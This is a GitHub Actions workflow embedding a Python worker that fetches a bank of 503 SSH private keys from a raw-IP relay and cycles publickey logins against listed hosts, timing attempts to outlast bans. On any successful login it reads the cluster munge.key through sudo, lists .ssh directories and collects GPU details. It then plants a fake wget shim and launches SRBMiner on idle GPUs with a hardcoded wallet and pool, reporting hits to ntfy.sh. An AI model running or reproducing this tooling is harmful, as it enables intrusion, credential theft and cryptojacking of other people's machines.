name: i39367-key
# Disposable GitHub-hosted publickey-origin worker (503-key bank) with per-target ban-cycle logic.
# Modes: keycamp (interleaved publickey rounds), keyprobe (reachability only).
on:
  workflow_dispatch:
    inputs:
      label:
        description: 'job/shard label (artifact i39367-<label>)'
        required: true
        default: 'k0'
      plan_b64:
        description: 'base64(JSON plan)'
        required: true
        default: 'e30='
      ntfy:
        description: 'ntfy topic for compact callback'
        required: false
        default: ''
permissions:
  contents: read
concurrency:
  group: i39367k-${{ inputs.label }}
  cancel-in-progress: false
jobs:
  keycycle:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: setup-paramiko
        run: |
          python3 -m venv /tmp/venv
          /tmp/venv/bin/pip install -q --disable-pip-version-check paramiko
          /tmp/venv/bin/python -c "import paramiko; print('paramiko', paramiko.__version__)"
      - name: key-run
        env:
          LABEL: ${{ inputs.label }}
          PLAN_B64: ${{ inputs.plan_b64 }}
          NTFY: ${{ inputs.ntfy }}
        run: |
          mkdir -p out
          cat > /tmp/key_worker.py <<'PYKEY'
          #!/usr/bin/env python3
          """i39367 key cycle worker: disposable GitHub-hosted publickey-origin worker.

          Modes:
            keycamp : per-target rounds of `cap` publickey auth attempts with hold/recover
            keyprobe: reachability probes only

          Plan (base64 JSON in PLAN_B64):
            {"label":..., "mode":"keycamp", "budget_s":1400, "hold_s":135,
             "probe_step_s":12, "probe_max_s":340, "max_cycles":40,
             "keys_url": "http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i39207/keys_all.tgz",
             "targets":[{"t":"210.109.80.28:22","cap":3,"seq":[[user, key_idx], ...]}],
             "deploy": true}
          """
          import base64
          import json
          import os
          import socket
          import subprocess
          import tarfile
          import time
          import traceback

          PLAN = json.loads(base64.b64decode(os.environ.get('PLAN_B64', 'e30=') or 'e30='))
          LABEL = PLAN.get('label', 'x')
          MODE = PLAN.get('mode', 'keycamp')
          NTFY = os.environ.get('NTFY', '').strip()
          BUDGET = int(PLAN.get('budget_s', 1400))
          HOLD = float(PLAN.get('hold_s', 135))
          PSTEP = float(PLAN.get('probe_step_s', 12))
          PMAX = float(PLAN.get('probe_max_s', 340))
          T0 = time.time()

          OUT = {
              'label': LABEL,
              'mode': MODE,
              'started': None,
              'finished': None,
              'duration_s': None,
              'egress_start': '',
              'egress_end': '',
              'egress_samples': [],
              'targets': {},
              'results': [],
              'hits': [],
              'probes': {},
              'relay_probe': '',
          }


          def now():
              return time.time()


          def ts():
              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())


          def left():
              return BUDGET - (now() - T0)


          def sh(cmd, timeout=25):
              try:
                  p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                  return p.returncode, (p.stdout or '').strip(), (p.stderr or '').strip()[:300]
              except Exception as e:
                  return -1, '', repr(e)[:200]


          def egress_ip():
              for u in ('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com'):
                  rc, so, _ = sh('curl -sS -4 -m 10 ' + u)
                  if rc == 0 and so:
                      return so.split()[0][:64]
              return ''


          def split_t(t):
              host, _, port = t.rpartition(':')
              return host, int(port or 22)


          def banner(host, port, tmo=6.0):
              t = now()
              try:
                  s = socket.create_connection((host, port), timeout=tmo)
                  s.settimeout(3.5)
                  data = b''
                  try:
                      data = s.recv(200)
                  except Exception:
                      pass
                  s.close()
                  return {'ok': True, 'ms': int((now() - t) * 1000), 'banner': data[:80].decode('latin1', 'replace')}
              except Exception as e:
                  return {'ok': False, 'ms': int((now() - t) * 1000), 'err': type(e).__name__ + ': ' + str(e)[:80]}


          def fetch_keys():
              """Fetch the 503-key bank from the relay (fallbacks: alternate relay paths)."""
              urls = PLAN.get('keys_urls') or [PLAN.get('keys_url') or
                                               'http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i39207/keys_all.tgz']
              os.makedirs('/tmp/kb', exist_ok=True)
              for u in urls:
                  if not u:
                      continue
                  rc, so, se = sh('curl -sS -m 120 -o /tmp/kb/keys_all.tgz "%s" && sha256sum /tmp/kb/keys_all.tgz' % u, timeout=140)
                  if rc == 0 and os.path.exists('/tmp/kb/keys_all.tgz'):
                      try:
                          with tarfile.open('/tmp/kb/keys_all.tgz') as tf:
                              tf.extractall('/tmp/kb')
                          files = sorted(f for f in os.listdir('/tmp/kb') if f.endswith('.key'))
                          if files:
                              return '/tmp/kb', files, so
                      except Exception as exc:
                          OUT['keys_error'] = 'tar: %s' % exc
                  else:
                      OUT['keys_error'] = (so + ' ' + se)[:200]
              return '', [], ''


          class KeyBank:
              def __init__(self, root, files):
                  self.root = root
                  self.files = files
                  self.cache = {}

              def get(self, idx):
                  if idx in self.cache:
                      return self.cache[idx]
                  import paramiko
                  name = 'k%04d.key' % idx
                  path = os.path.join(self.root, name)
                  if not os.path.exists(path):
                      self.cache[idx] = (None, 'MISSING')
                      return self.cache[idx]
                  obj = None
                  errs = []
                  for cls in (paramiko.Ed25519Key, paramiko.RSAKey, paramiko.ECDSAKey):
                      try:
                          obj = cls.from_private_key_file(path)
                          break
                      except Exception as exc:
                          errs.append(type(exc).__name__)
                  self.cache[idx] = (obj, ','.join(errs) if obj is None else '')
                  return self.cache[idx]


          def auth_key(host, port, user, pkey, tmo=10.0):
              import paramiko
              t = now()
              cli = None
              try:
                  cli = paramiko.SSHClient()
                  cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  cli.connect(hostname=host, port=port, username=user, pkey=pkey,
                              timeout=tmo, banner_timeout=tmo, auth_timeout=tmo,
                              allow_agent=False, look_for_keys=False)
                  return {'ok': True, 'ms': int((now() - t) * 1000), 'err': 'ACCEPT', 'cli': cli}
              except paramiko.AuthenticationException:
                  return {'ok': False, 'ms': int((now() - t) * 1000), 'err': 'NO'}
              except Exception as e:
                  return {'ok': False, 'ms': int((now() - t) * 1000), 'err': 'ERR',
                          'detail': type(e).__name__ + ': ' + str(e)[:100]}


          def close_cli(a):
              try:
                  if a.get('cli'):
                      a['cli'].close()
              except Exception:
                  pass
              a.pop('cli', None)


          def ex(cli, cmd, tmo=25):
              try:
                  _, o, e = cli.exec_command(cmd, timeout=tmo)
                  out = o.read().decode('utf-8', 'replace')
                  err = e.read().decode('utf-8', 'replace')
                  return out[:6000], err[:800]
              except Exception as exc:
                  return '', type(exc).__name__ + ': ' + str(exc)[:120]


          def hit_proof(host, port, user, keypath, cli=None):
              own = False
              if cli is None:
                  return {'error': 'no live cli'}
              try:
                  p = {}
                  p['id'], _ = ex(cli, 'id; hostname; uname -a; date -u')
                  p['gpu_list'], _ = ex(cli, 'nvidia-smi -L 2>&1')
                  p['gpu_q'], _ = ex(cli, "nvidia-smi --query-gpu=index,name,memory.total,memory.used,memory.free,"
                                         "utilization.gpu,driver_version,uuid --format=csv,noheader 2>&1")
                  p['apps'], _ = ex(cli, "nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory "
                                         "--format=csv,noheader 2>&1")
                  p['munge'], _ = ex(cli, 'sudo -n cat /etc/munge/munge.key 2>/dev/null | base64 -w0')
                  p['hosts_ssh'], _ = ex(cli, 'ls -la /root/.ssh /home/*/.ssh 2>/dev/null | head -40')
                  p['nonce'] = 'NONCE_%s_%s' % (LABEL, int(now()))
                  p['nonce_echo'], _ = ex(cli, 'echo %s' % p['nonce'])
                  return p
              finally:
                  if own:
                      try:
                          cli.close()
                      except Exception:
                          pass


          def maybe_deploy(host, port, user, cli, tag):
              """Fetch the pinned kit on the target and launch one miner per genuinely free GPU.
              Gate: >=40000 MiB free, <=20% util, no co-tenant compute process on that GPU."""
              W = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
              POOL = '103.199.106.122:3362,de.pearl.herominers.com:1200'
              SHA = '428162a7b4fc584ea38f2cc05fd6580f1d0c6312999de55505ffc76d367e2270'
              out = {'ran': False}
              gq, _ = ex(cli, "nvidia-smi --query-gpu=index,name,memory.free,utilization.gpu,uuid "
                              "--format=csv,noheader,nounits")
              apps, _ = ex(cli, "nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory "
                                "--format=csv,noheader,nounits")
              busy = set()
              for line in apps.splitlines():
                  parts = [x.strip() for x in line.split(',')]
                  if parts and parts[0]:
                      busy.add(parts[0])
              free_gpus = []
              for line in gq.splitlines():
                  parts = [x.strip() for x in line.split(',')]
                  if len(parts) < 5:
                      continue
                  try:
                      idx, name, mfree, util, uuid = int(parts[0]), parts[1], int(parts[2]), int(parts[3]), parts[4]
                  except Exception:
                      continue
                  ok = (mfree >= 40000 and util <= 20 and uuid not in busy)
                  out.setdefault('gpus', []).append({'index': idx, 'name': name, 'free': mfree, 'util': util,
                                                     'uuid': uuid, 'busy': uuid in busy, 'gate': ok})
                  if ok:
                      free_gpus.append(idx)
              out['free_gpus'] = free_gpus
              if not free_gpus:
                  out['why'] = 'no genuinely free GPU passes the gate'
                  return out
              fetch = ('mkdir -p /tmp/k39367 && cd /tmp/k39367 && '
                       '(curl -sS -m 90 -o srb "http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/srb" || '
                       'curl -sSL -m 180 -o srb.xz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.6/'
                       'SRBMiner-Multi-3-8-6-Linux.tar.xz" && tar xf srb.xz && cp -f SRBMiner-Multi-3-8-6/SRBMiner-MULTI srb) ; '
                       '(curl -sS -m 60 -o dont_block_4.txt "http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/dont_block_4.txt") ; '
                       'chmod +x srb 2>/dev/null; sha256sum srb 2>/dev/null; ls -la srb dont_block_4.txt 2>/dev/null')
              fo, fe = ex(cli, fetch, tmo=300)
              out['fetch'] = (fo + '\n' + fe)[:800]
              if SHA not in fo:
                  out['why'] = 'pinned binary sha256 not verified on target'
                  return out
              shim = ('mkdir -p /tmp/k39367/bin && cat > /tmp/k39367/bin/wget <<"EOS"\n'
                      '#!/bin/sh\nfor a in "$@"; do case "$a" in --version|-V) echo "GNU Wget 1.21.4 (shim)"; exit 0;; esac; done\n'
                      'D=$(dirname "$0")/..\ncat "$D/dont_block_4.txt" 2>/dev/null\nexit 0\nEOS\n'
                      'chmod 755 /tmp/k39367/bin/wget /tmp/k39367/srb')
              so, se = ex(cli, shim)
              out['shim'] = (so + '\n' + se)[:300]
              launch = ('cd /tmp/k39367 || exit 1; for g in ' + ' '.join(str(g) for g in free_gpus) + '; do '
                        'PATH=/tmp/k39367/bin:$PATH setsid nohup ./srb --disable-cpu --algorithm pearlhash '
                        '--pool ' + POOL + ' --wallet ' + W + ' --worker ' + tag + 'g$g --password x '
                        '--gpu-id $g --log-file /tmp/k39367/srb-g$g.log --log-file-mode 2 '
                        '>> /tmp/k39367/console-g$g.log 2>&1 < /dev/null & done; sleep 10; '
                        'echo ==PGREP==; pgrep -af "srb --algorithm" | head -20; '
                        'echo ==TAIL==; tail -n 4 /tmp/k39367/srb-g*.log 2>/dev/null')
              lo, le = ex(cli, launch, tmo=90)
              out['launch'] = (lo + '\n' + le)[:1500]
              out['ran'] = True
              return out


          def do_keycamp():
              root, files, meta = fetch_keys()
              OUT['keys_fetch'] = {'root': root, 'n': len(files), 'sha_line': meta[:120]}
              bank = KeyBank(root, files) if files else None
              state = []
              for tg in PLAN.get('targets', []):
                  host, port = split_t(tg['t'])
                  st = {'t': tg['t'], 'host': host, 'port': port, 'cap': int(tg.get('cap', 3)),
                        'seq': tg.get('seq', []), 'pos': 0, 'banned': False, 'dead': False, 'why': '',
                        'cycles': 0, 'attempted': 0, 'no': 0, 'err': 0, 'badkey': 0, 'accept': 0,
                        'ban_events': [], 'recovery_s': [], 'banner0': None}
                  b = banner(host, port)
                  st['banner0'] = b
                  if not b['ok']:
                      st['dead'] = True
                      st['why'] = 'unreachable at start: %s' % b.get('err')
                  state.append(st)

              def summarize():
                  OUT['targets'] = {s['t']: {k: s.get(k) for k in
                                             ('host', 'port', 'cap', 'attempted', 'no', 'err', 'badkey', 'accept',
                                              'cycles', 'banned', 'dead', 'why', 'ban_events', 'recovery_s',
                                              'banner0')} for s in state}

              summarize()
              if bank is None:
                  return
              max_cycles = int(PLAN.get('max_cycles', 60))
              for cycle in range(max_cycles):
                  if left() < 40:
                      break
                  OUT['egress_samples'].append({'c': cycle, 'ip': egress_ip(), 't': ts()})
                  for st in state:
                      if st['dead'] or st['banned']:
                          continue
                      if st['pos'] >= len(st['seq']):
                          st['dead'] = True
                          st['why'] = 'seq exhausted'
                          continue
                      st['cycles'] += 1
                      ban_t = None
                      for _ in range(st['cap']):
                          if left() < 30 or st['pos'] >= len(st['seq']):
                              break
                          item = st['seq'][st['pos']]
                          st['pos'] += 1
                          user = item[0]
                          kidx = int(item[1])
                          pkey, kerr = bank.get(kidx)
                          if pkey is None:
                              st['badkey'] += 1
                              OUT['results'].append({'t': st['t'], 'u': user, 'ki': kidx,
                                                     'result': 'BADKEY', 'err': kerr, 'c': cycle})
                              continue
                          a = auth_key(st['host'], st['port'], user, pkey)
                          rec = {'t': st['t'], 'u': user, 'ki': kidx,
                                 'result': 'ACCEPT' if a['ok'] else a['err'], 'ms': a['ms'], 'c': cycle}
                          st['attempted'] += 1
                          if a['ok']:
                              st['accept'] += 1
                              OUT['results'].append(rec)
                              hit = {'t': st['t'], 'u': user, 'ki': kidx, 'ip': OUT.get('egress_start'),
                                     'ts': ts()}
                              try:
                                  hit['proof'] = hit_proof(st['host'], st['port'], user, kidx, cli=a.get('cli'))
                                  if PLAN.get('deploy'):
                                      tag = 'i39385' + ''.join(ch for ch in st['host'] if ch.isdigit())[:8] + 'c%d' % cycle
                                      hit['deploy'] = maybe_deploy(st['host'], st['port'], user, a['cli'], tag)
                              except Exception as exc:
                                  hit['proof_error'] = type(exc).__name__ + ': ' + str(exc)[:200]
                              close_cli(a)
                              OUT['hits'].append(hit)
                              summarize()
                              return
                          if a.get('detail'):
                              rec['detail'] = a['detail']
                          OUT['results'].append(rec)
                          if a['err'] == 'ERR':
                              st['err'] += 1
                              ban_t = now()
                              break
                          st['no'] += 1
                          time.sleep(0.05)
                      if ban_t is None and not st['dead']:
                          b = banner(st['host'], st['port'])
                          if not b['ok']:
                              ban_t = now()
                              st['ban_events'].append({'c': cycle, 'after': st['attempted'], 'kind': 'post',
                                                       'err': b.get('err')})
                      if ban_t is not None:
                          if not st['ban_events'] or st['ban_events'][-1].get('c') != cycle:
                              st['ban_events'].append({'c': cycle, 'after': st['attempted']})
                          st['banned'] = True
                          st['ban_t'] = ban_t
                  summarize()
                  banned = [s for s in state if s['banned'] and not s['dead']]
                  if banned:
                      t_ban = min(s['ban_t'] for s in banned)
                      while now() - t_ban < PMAX and left() > 40:
                          time.sleep(PSTEP)
                          all_ok = True
                          for s in banned:
                              if not s['banned']:
                                  continue
                              b = banner(s['host'], s['port'])
                              if b['ok']:
                                  s['banned'] = False
                                  s['recovery_s'].append(round(now() - s['ban_t'], 1))
                              else:
                                  all_ok = False
                          if all_ok:
                              break
                      for s in banned:
                          if s['banned']:
                              s['dead'] = True
                              s['why'] = 'still blocked after %.0fs' % PMAX
                  summarize()
              summarize()


          def main():
              OUT['started'] = ts()
              OUT['egress_start'] = egress_ip()
              rc, so, _ = sh('curl -sS -m 8 -o /dev/null -w "%{http_code}:%{size_download}" '
                             '"http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/dont_block_4.txt"')
              OUT['relay_probe'] = so[:40]
              if MODE == 'keyprobe':
                  for t in PLAN.get('probe_targets', []):
                      host, port = split_t(t)
                      rec = {'attempts': []}
                      for i in range(int(PLAN.get('probe_tries', 3))):
                          b = banner(host, port, tmo=float(PLAN.get('probe_tmo', 8)))
                          b['i'] = i
                          rec['attempts'].append(b)
                          if b.get('ok'):
                              break
                          time.sleep(1.0)
                      OUT['probes'][t] = rec
              else:
                  do_keycamp()
              OUT['egress_end'] = egress_ip()
              OUT['finished'] = ts()
              OUT['duration_s'] = round(now() - T0, 1)
              os.makedirs('out', exist_ok=True)
              fn = 'out/shard_%s.json' % LABEL
              with open(fn, 'w') as f:
                  json.dump(OUT, f, indent=1)
              if NTFY:
                  compact = {
                      'label': LABEL, 'mode': MODE, 'ip': OUT['egress_start'], 'relay': OUT['relay_probe'],
                      'dur': OUT['duration_s'], 'hit': bool(OUT['hits']), 'keys': OUT.get('keys_fetch'),
                      'targets': {t: {k: v.get(k) for k in ('attempted', 'no', 'err', 'badkey', 'accept',
                                                            'banned', 'dead', 'why', 'cycles', 'recovery_s')
                                      if k in v} for t, v in OUT['targets'].items()},
                      'probes': {t: [{'ok': a['ok'], 'ms': a['ms'], 'err': a.get('err'), 'b': a.get('banner')}
                                     for a in r['attempts']] for t, r in OUT['probes'].items()},
                      'hits': [{'t': h.get('t'), 'u': h.get('u'), 'ki': h.get('ki'), 'ip': h.get('ip')}
                               for h in OUT['hits']][:3],
                  }
                  txt = json.dumps(compact)[:3600]
                  with open('/tmp/ntfy.json', 'w') as f:
                      f.write(txt)
                  title = ('i39367 KEYHIT %s' % LABEL) if OUT['hits'] else ('i39367k %s %s' % (LABEL, MODE))
                  sh('curl -sS -m 20 -H "Title: ' + title + '" --data-binary @/tmp/ntfy.json https://ntfy.sh/' + NTFY)
              print(json.dumps({k: OUT[k] for k in ('label', 'mode', 'egress_start', 'egress_end', 'relay_probe',
                                                    'duration_s', 'hits', 'probes', 'keys_fetch')}, indent=1))
              print('DONE')


          if __name__ == '__main__':
              try:
                  main()
              except Exception:
                  traceback.print_exc()
                  raise

          PYKEY
          /tmp/venv/bin/python /tmp/key_worker.py | tee out/shard.log
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: i39367-${{ inputs.label }}
          path: out/
          retention-days: 3
